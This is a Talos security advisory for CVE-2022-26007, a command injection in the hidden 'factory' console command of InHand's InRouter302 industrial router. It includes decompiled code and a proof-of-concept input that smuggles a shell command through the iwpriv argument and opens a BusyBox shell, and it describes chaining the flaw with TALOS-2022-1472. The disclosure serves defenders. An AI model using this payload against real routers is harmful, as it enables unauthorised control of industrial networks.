# Talos Vulnerability Report

### TALOS-2022-1475

## InHand Networks InRouter302 console factory OS command injection vulnerability

##### May 10, 2022

##### CVE Number

CVE-2022-26007

### Summary

An OS command injection vulnerability exists in the console factory functionality of InHand Networks InRouter302 V3.5.4. A specially-crafted network request can lead to command execution. An attacker can send a sequence of requests to trigger this vulnerability.

### Tested Versions

InHand Networks InRouter302 V3.5.4

### Product URLs

InRouter302 - <https://www.inhandnetworks.com/products/inrouter300.html>

### CVSSv3 Score

9.1 - CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
9.9 - CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H - chain: TALOS-2022-1472

### CWE

CWE-77 - Improper Neutralization of Special Elements used in a Command (‘Command Injection’)

### Details

The InRouter302 is an industrial LTE router. It features remote management functionalities and several security protection mechanism, such as: VPN technologies, firewall functionalities, authorization management and several other features.

The InRouter302 offers telnet and sshd services. Both, when provided with the correct credentials, will allow access to the Router console.

Here the prompt after the login:

Several commands are available. The Router console offers, after the user provides the privileged user password, additional privileged functionalities. Here is the prompt after providing the privileged user credentials:

```
Router> enable

Router#

```

The Router console contains a command, called `factory`, that is not listed among the available functions. This is probably a leftover debug code.

Here is the function that will manage the `factory` command in the privileged user level:

```
int factory_functionality(undefined4 param_1,char *command_line_provided)

{
  [...]

  if ((command_line_provided == (char *)0x0) || (*command_line_provided == '\0')) {
    is_command = -2;
  }
  else {
    second_arg = command_line_provided;
    first_arg = (char *)maybe_get_next_token(second_arg);
    [...]
    is_command = strncmp(first_arg,"iwpriv",6);                                                         [1]
    if (is_command != 0) {
      return 0;
    }
    if (*second_arg == '\"') {
      second_arg = second_arg + 1;
    }
    second_arg_ = second_arg;
    [...]
    sprintf(command_line_buff,"iwpriv %s",second_arg_);                                                 [2]
    system(command_line_buff);                                                                          [3]
  }
  [...]
}

```

The `command_line_provided` argument is what follows the `factory` command. The `command_line_provided` is split, using the space character, into two tokens. If the first token provided is `iwpriv`, checked at `[1]`, then later the second token, at `[2]`, will be used to create the `iwpriv <second_token>` command. This command will be executed, at `[3]`, with `system`.

An attacker could exploit the second token to perform a command injection in the call to `system` at `[3]`.

Note that, while this issue requires the most privileged logged-in user, it’s possible to use TALOS-2022-1472 to perform this API starting from a low-privileged user credentials. In this case, the actual chained CVSS score would be 9.9 - CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H.

### Exploit Proof of Concept

After entering the privileged user level mode, using the `enable` command, providing the following string: `factory iwpriv `/bin/sh$IFS1>&2`` will prompt a /bin/sh shell:

```
Router# factory iwpriv `/bin/sh$IFS1>&2`

BusyBox v1.26.2 (2020-10-14 18:29:02 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.
